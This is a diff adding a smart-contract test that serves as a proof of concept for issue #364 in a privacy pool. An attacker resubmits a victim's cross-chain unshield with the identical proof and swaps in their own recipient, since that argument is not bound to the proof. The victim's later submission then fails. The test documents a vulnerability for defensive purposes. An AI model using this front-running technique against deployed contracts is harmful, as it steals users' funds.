@@ -492,6 +492,61 @@ describe("Privacy Pool Adversarial", function () {
       const isSpent = await privacyPool.nullifiers(0, nullifier);
       expect(isSpent).to.be.true;
     });
+
+    // WHY: PoC for #364. The cross-chain unshield destination (`finalRecipient`) is a plaintext
+    // argument that never enters proof validation and is not committed by `hashBoundParams`, unlike
+    // the local unshield path where the recipient is derived from the proof-bound note npk. This
+    // verifies that an attacker can front-run a victim's cross-chain unshield with the identical
+    // proof and redirect the funds — a direct theft of every cross-chain exit.
+    it("PoC #364: attacker front-runs a cross-chain unshield and redirects the funds", async function () {
+      const usdcAddr = await hubUsdc.getAddress();
+      const root = await shieldAndGetRoot(ethers.parseUnits("200", 6));
+      const unshieldAmount = ethers.parseUnits("50", 6);
+      const nullifier = ethers.keccak256(ethers.toUtf8Bytes("poc364-nullifier"));
+
+      // The unshield note is bound to a specific npk via the commitment hash (a SNARK public
+      // input). Here the npk encodes the VICTIM (bob) — the note cryptographically "belongs" to bob.
+      const victimNpk = ethers.zeroPadValue(bobAddress, 32);
+      const commitHash = computeCommitmentHash(BigInt(bobAddress), BigInt(usdcAddr), BigInt(unshieldAmount));
+
+      const buildTx = () =>
+        makeTransaction({
+          merkleRoot: root,
+          nullifiers: [nullifier],
+          commitments: [commitHash],
+          unshield: 1,
+          unshieldPreimage: {
+            npk: victimNpk,
+            token: { tokenType: 0, tokenAddress: usdcAddr, tokenSubID: 0 },
+            value: unshieldAmount,
+          },
+        });
+
+      // The CrossChainUnshieldInitiated event is emitted (via delegatecall) from the pool's
+      // address using TransactModule's ABI, so decode it through a TransactModule-at-pool handle.
+      const poolAsTransact = transactModule.attach(privacyPoolAddress);
+
+      // Bob would submit this with finalRecipient = bob. But `finalRecipient` never enters proof
+      // validation, so the attacker resubmits the IDENTICAL transaction (same proof, same note,
+      // same nullifier) with finalRecipient = attacker.
+      await expect(
+        privacyPool
+          .connect(attacker)
+          .atomicCrossChainUnshield(buildTx(), DOMAINS.client, attackerAddress, ethers.ZeroHash, 0)
+      )
+        .to.emit(poolAsTransact, "CrossChainUnshieldInitiated")
+        .withArgs(DOMAINS.client, attackerAddress, unshieldAmount, 0);
+
+      // The note's npk encoded BOB, yet the CCTP burn was directed to the ATTACKER — the recipient
+      // is unbound. The nullifier is now spent, so bob's own (identical, correct) submission
+      // reverts: his funds are already gone to the attacker.
+      expect(await privacyPool.nullifiers(0, nullifier)).to.be.true;
+      await expect(
+        privacyPool
+          .connect(bob)
+          .atomicCrossChainUnshield(buildTx(), DOMAINS.client, bobAddress, ethers.ZeroHash, 0)
+      ).to.be.revertedWith("TransactModule: Note already spent");
+    });
   });
 
   // ═══════════════════════════════════════════════════════════════════
